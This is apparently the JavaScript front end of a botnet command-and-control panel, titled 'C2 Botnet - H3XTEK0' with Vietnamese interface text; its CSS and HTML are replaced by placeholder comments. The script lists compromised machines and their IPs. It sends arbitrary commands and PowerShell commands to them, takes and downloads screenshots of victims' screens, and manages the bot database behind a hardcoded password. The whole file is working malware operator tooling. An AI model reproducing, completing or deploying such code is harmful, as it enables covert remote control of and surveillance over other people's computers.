<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>C2 Botnet - H3XTEK0</title>
    <style>
        /* ... GIỮ NGUYÊN CSS CŨ ... */
    </style>
</head>
<body>
    <!-- ... GIỮ NGUYÊN HTML ... -->
    
    <script>
        const API_PASSWORD = 'H3XTEK0';
        let botsData = [];
        let pollingInterval = null;
        let lastScreenshotData = null;

        function getAuth() { return { 'Authorization': `Bearer ${API_PASSWORD}` }; }
        function closeModal(id) { 
            const el = document.getElementById(id);
            if (el) {
                el.classList.remove('active');
                el.style.display = 'none';
            }
        }
        function openModal(id) { 
            const el = document.getElementById(id);
            if (el) {
                el.style.display = 'flex';
                setTimeout(() => el.classList.add('active'), 10);
            }
        }

        // ============================================================
        // FETCH BOTS
        // ============================================================
        async function fetchBots() {
            try {
                const res = await fetch('/api/bots', { headers: getAuth() });
                const data = await res.json();
                botsData = data;
                renderBots(data);
                updateStats(data);
            } catch (e) {
                console.error('Lỗi fetch bots:', e);
                document.getElementById('botsTable').innerHTML = 
                    `<tr><td colspan="8" style="text-align:center;padding:20px;color:#ff4444;">❌ Lỗi kết nối server</td></tr>`;
            }
        }

        function renderBots(data) {
            const tbody = document.getElementById('botsTable');
            tbody.innerHTML = '';
            if (!data || data.length === 0) {
                tbody.innerHTML = `<tr><td colspan="8" style="text-align:center;padding:30px;color:#444;">🔴 Chưa có bot nào kết nối</td></tr>`;
                return;
            }
            data.forEach(b => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td><strong>${b.bot_id.slice(0, 8)}...</strong></td>
                    <td>${b.group_name || 'default'}</td>
                    <td>v${b.version || '1.0'}</td>
                    <td>${b.os || 'Unknown'}</td>
                    <td>${b.ip || 'N/A'}</td>
                    <td>${b.last_seen ? new Date(b.last_seen).toLocaleString() : 'N/A'}</td>
                    <td class="${b.online ? 'online' : 'offline'}">${b.online ? '🟢 Online' : '🔴 Offline'}</td>
                    <td style="display:flex;gap:4px;flex-wrap:wrap;">
                        <button class="btn btn-primary btn-small" onclick="selectBot('${b.bot_id}')">Chọn</button>
                        <button class="btn btn-outline btn-small" onclick="openPsModal('${b.bot_id}')">💻 PS</button>
                        <button class="btn btn-outline btn-small" onclick="takeScreenshot('${b.bot_id}')">📸</button>
                        <button class="btn btn-danger btn-small" onclick="deleteBot('${b.bot_id}')">🗑️</button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }

        function updateStats(data) {
            const total = data.length;
            const online = data.filter(b => b.online).length;
            const offline = total - online;
            const groups = new Set(data.map(b => b.group_name)).size;
            document.getElementById('totalBots').textContent = total;
            document.getElementById('onlineBots').textContent = online;
            document.getElementById('offlineBots').textContent = offline;
            document.getElementById('groupsCount').textContent = groups || 0;
        }

        function selectBot(botId) { 
            document.getElementById('botIdInput').value = botId; 
        }

        async function deleteBot(botId) {
            if (!confirm(`Xóa bot ${botId.slice(0,8)}...?`)) return;
            try {
                const res = await fetch(`/api/bots/${botId}`, { method: 'DELETE', headers: getAuth() });
                if (res.ok) {
                    alert('✅ Đã xóa bot');
                    fetchBots();
                } else {
                    alert('❌ Xóa thất bại');
                }
            } catch (e) {
                alert('❌ Lỗi: ' + e.message);
            }
        }

        // ============================================================
        // POLLING - FIXED
        // ============================================================
        function startPolling(cmdId, isScreenshot = false) {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }

            let attempts = 0;
            const maxAttempts = 60;
            const resultDisplay = document.getElementById('cmdResultDisplay');
            
            // GỬI REQUEST NGAY LẬP TỨC
            checkResult();

            pollingInterval = setInterval(checkResult, 1000);

            async function checkResult() {
                attempts++;
                try {
                    console.log(`[POLL] Checking result for: ${cmdId} (attempt ${attempts})`);
                    
                    const res = await fetch(`/api/results/${cmdId}`, { 
                        headers: getAuth() 
                    });
                    
                    if (!res.ok) {
                        console.warn(`[POLL] API returned ${res.status}`);
                        resultDisplay.textContent = `⚠️ Lỗi server (${res.status})`;
                        return;
                    }
                    
                    const data = await res.json();
                    console.log(`[POLL] Status: ${data.status}`, data);

                    // KIỂM TRA KẾT QUẢ
                    if (data.status === 'ok' || data.status === 'error' || data.status === 'done') {
                        clearInterval(pollingInterval);
                        pollingInterval = null;

                        // XỬ LÝ SCREENSHOT
                        if (isScreenshot && data.result && data.result.startsWith('data:image')) {
                            resultDisplay.innerHTML = `<span class="ok">✅ Ảnh đã sẵn sàng</span>`;
                            lastScreenshotData = data.result;
                            document.getElementById('screenshotImage').src = data.result;
                            openModal('screenshotModal');
                            fetchBots();
                            return;
                        }

                        // HIỂN THỊ KẾT QUẢ
                        if (data.result) {
                            const preview = data.result.length > 60 ? data.result.substring(0, 60) + '...' : data.result;
                            resultDisplay.innerHTML = `<span class="ok">✅ ${preview}</span>`;
                            
                            document.getElementById('resultModalTitle').textContent = '📋 Kết quả lệnh';
                            document.getElementById('resultContent').textContent = data.result;
                            openModal('resultModal');
                        } else if (data.status === 'error') {
                            resultDisplay.innerHTML = `<span class="error">❌ Lỗi: ${data.result || 'Không xác định'}</span>`;
                        } else {
                            resultDisplay.innerHTML = `<span class="warn">⚠️ Không có kết quả</span>`;
                        }
                        fetchBots();
                        return;
                    }

                    // CẬP NHẬT TRẠNG THÁI
                    if (data.status === 'pending') {
                        resultDisplay.textContent = `⏳ Đang chờ bot xử lý... (${attempts}s)`;
                    } else if (data.status === 'not_found') {
                        resultDisplay.textContent = `⏳ Đang tìm kiếm kết quả... (${attempts}s)`;
                        // THỬ DEBUG SAU 5 GIÂY
                        if (attempts === 5) {
                            debugCommand(cmdId);
                        }
                    }

                    // HẾT THỜI GIAN
                    if (attempts >= maxAttempts) {
                        clearInterval(pollingInterval);
                        pollingInterval = null;
                        resultDisplay.innerHTML = `<span class="error">⏰ Hết thời gian chờ (${maxAttempts}s)</span>`;
                        debugCommand(cmdId);
                    }
                } catch (e) {
                    console.error('[POLL] Error:', e);
                    if (attempts >= maxAttempts) {
                        clearInterval(pollingInterval);
                        pollingInterval = null;
                        resultDisplay.innerHTML = `<span class="error">❌ Lỗi: ${e.message}</span>`;
                    }
                }
            }
        }

        // ============================================================
        // DEBUG COMMAND
        // ============================================================
        async function debugCommand(cmdId) {
            try {
                const res = await fetch(`/api/debug/command/${cmdId}`, { headers: getAuth() });
                const data = await res.json();
                console.log('[DEBUG] Command status:', data);
                const resultDisplay = document.getElementById('cmdResultDisplay');
                if (data.in_commands) {
                    resultDisplay.innerHTML = `<span class="warn">📌 Command đã có trong DB nhưng chưa có kết quả</span>`;
                } else if (data.in_pending) {
                    resultDisplay.innerHTML = `<span class="warn">📌 Command đang trong hàng đợi</span>`;
                } else {
                    resultDisplay.innerHTML = `<span class="error">❌ Command không tồn tại trong DB</span>`;
                }
            } catch (e) {
                console.error('[DEBUG] Error:', e);
            }
        }

        // ============================================================
        // SEND COMMAND - FIXED
        // ============================================================
        async function sendCommand() {
            const botId = document.getElementById('botIdInput').value.trim();
            const command = document.getElementById('cmdInput').value.trim();
            const argsRaw = document.getElementById('argsInput').value.trim();
            
            let args = [];
            try { 
                if (argsRaw) args = JSON.parse(argsRaw); 
            } catch (e) { 
                alert('Args phải là JSON array hợp lệ! Ví dụ: ["arg1", "arg2"]'); 
                return; 
            }
            
            if (!command) { 
                alert('Nhập lệnh đi!'); 
                return; 
            }
            if (!botId) { 
                alert('Nhập Bot ID!'); 
                return; 
            }
            
            const bot = botsData.find(b => b.bot_id === botId);
            if (!bot) { 
                alert('Bot ID không tồn tại!'); 
                return; 
            }
            if (!bot.online) { 
                alert('Bot đang offline!'); 
                return; 
            }

            const resultDisplay = document.getElementById('cmdResultDisplay');
            resultDisplay.textContent = '⏳ Đang gửi...';

            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bot_id: botId, command, args })
                });
                const data = await res.json();

                if (data.status === 'sent' || data.status === 'queued') {
                    const cmdId = data.cmd_id;
                    resultDisplay.textContent = `⏳ Đã gửi, đợi kết quả... (${cmdId.slice(-6)})`;
                    const isScreenshot = (command === 'sc');
                    startPolling(cmdId, isScreenshot);
                } else {
                    resultDisplay.innerHTML = `<span class="error">⚠️ ${data.status || 'Lỗi không xác định'}</span>`;
                }
            } catch (e) {
                resultDisplay.innerHTML = `<span class="error">❌ Lỗi: ${e.message}</span>`;
            }
        }

        // ============================================================
        // SCREENSHOT
        // ============================================================
        async function takeScreenshot(botId) {
            if (!botId) { 
                alert('Chọn Bot ID!'); 
                return; 
            }
            const bot = botsData.find(b => b.bot_id === botId);
            if (!bot) { 
                alert('Bot không tồn tại!'); 
                return; 
            }
            if (!bot.online) { 
                alert('Bot đang offline!'); 
                return; 
            }

            document.getElementById('botIdInput').value = botId;
            document.getElementById('cmdInput').value = 'sc';
            document.getElementById('argsInput').value = '[]';
            sendCommand();
        }

        function refreshScreenshot() {
            const botId = document.getElementById('botIdInput').value.trim();
            if (botId) takeScreenshot(botId);
            else alert('Nhập Bot ID trước!');
        }

        function downloadScreenshot() {
            if (!lastScreenshotData) return;
            const link = document.createElement('a');
            link.download = `screenshot_${Date.now()}.jpg`;
            link.href = lastScreenshotData;
            link.click();
        }

        // ============================================================
        // PS COMMAND
        // ============================================================
        function openPsModal(botId) {
            const id = botId || document.getElementById('botIdInput').value.trim();
            if (!id) { 
                alert('Nhập Bot ID trước!'); 
                return; 
            }
            document.getElementById('psBotIdInput').value = id;
            document.getElementById('psCommandInput').value = '';
            document.getElementById('psCommandInput').focus();
            openModal('psModal');
        }

        async function sendPsCommand() {
            const botId = document.getElementById('psBotIdInput').value.trim();
            const command = document.getElementById('psCommandInput').value.trim();
            
            if (!botId) { 
                alert('Nhập Bot ID!'); 
                return; 
            }
            if (!command) { 
                alert('Nhập lệnh PowerShell!'); 
                return; 
            }
            
            const bot = botsData.find(b => b.bot_id === botId);
            if (!bot) { 
                alert('Bot không tồn tại!'); 
                return; 
            }
            if (!bot.online) { 
                alert('Bot đang offline!'); 
                return; 
            }

            closeModal('psModal');
            
            document.getElementById('botIdInput').value = botId;
            document.getElementById('cmdInput').value = `ps ${command}`;
            document.getElementById('argsInput').value = '[]';
            sendCommand();
        }

        // ============================================================
        // DB & CLEAR
        // ============================================================
        async function viewDB() {
            try {
                const res = await fetch('/api/db', { headers: getAuth() });
                const data = await res.json();
                document.getElementById('dbContent').textContent = JSON.stringify(data, null, 2);
                openModal('dbModal');
            } catch (e) {
                alert('Lỗi: ' + e.message);
            }
        }

        async function clearAllData() {
            if (!confirm('⚠️ Xóa TOÀN BỘ database? Không thể hoàn tác!')) return;
            if (!confirm('Xác nhận lần cuối?')) return;
            try {
                const res = await fetch('/api/db', { method: 'DELETE', headers: getAuth() });
                if (res.ok) {
                    alert('✅ Đã xóa toàn bộ');
                    fetchBots();
                } else {
                    alert('❌ Xóa thất bại');
                }
            } catch (e) {
                alert('❌ Lỗi: ' + e.message);
            }
        }

        // ============================================================
        // KEYBOARD SHORTCUTS
        // ============================================================
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                if (document.getElementById('psModal').classList.contains('active')) {
                    sendPsCommand();
                }
                if (document.getElementById('cmdInput') === document.activeElement) {
                    sendCommand();
                }
            }
        });

        // ============================================================
        // AUTO REFRESH
        // ============================================================
        setInterval(fetchBots, 5000);
        fetchBots();

        // ============================================================
        // MODAL CLOSE
        // ============================================================
        document.querySelectorAll('.modal').forEach(m => {
            m.addEventListener('click', (e) => {
                if (e.target === m) {
                    m.classList.remove('active');
                    m.style.display = 'none';
                }
            });
        });

        // EXPOSE FUNCTIONS
        window.openPsModal = openPsModal;
        window.takeScreenshot = takeScreenshot;
        window.sendCommand = sendCommand;
        window.sendPsCommand = sendPsCommand;
        window.viewDB = viewDB;
        window.clearAllData = clearAllData;
        window.downloadScreenshot = downloadScreenshot;
        window.refreshScreenshot = refreshScreenshot;
    </script>
</body>
</html>
